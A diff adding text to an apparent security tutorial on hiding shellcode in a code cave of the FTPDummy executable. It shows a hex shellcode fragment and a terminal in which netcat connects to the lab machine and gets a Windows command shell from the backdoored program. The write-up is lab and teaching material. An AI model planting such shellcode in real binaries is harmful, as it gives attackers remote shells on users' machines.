@@ -103,3 +103,29 @@ fce8820000006089e531c0648b50308b520c8b52148b72280fb74a2631ffac3c617c022c20c1cf0d
 The empty space is selected and a binary paste is arranged.
 
 ![](/assets/img/Code_Cave/12.png)
+
+The code seems to have been pasted as expected.
+
+![](/assets/img/Code_Cave/13.png)
+
+Now, on these circumstances, if we desired to follow the execution, the shellcode would be executed perfectly well. Nevertheless, the program would not, crashing whenever the shellcode exits. Let's put this to the test.
+
+If the execution is run (SHIFT+F9), the shellcode will be executed.
+
+
+
+![](/assets/img/Code_Cave/14.png)
+
+```term
+root@whitecr0wz:~# rlwrap nc 192.168.100.149 9000 -v 
+192.168.100.149: inverse host lookup failed: Unknown host
+(UNKNOWN) [192.168.100.149] 9000 (?) open
+Microsoft Windows [Version 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+C:\Users\IEUser\Desktop2\FTPDummy_Code_Cave>
+```
+
+However, once exited, the program is terminated.
+
+![](/assets/img/Code_Cave/15.png)
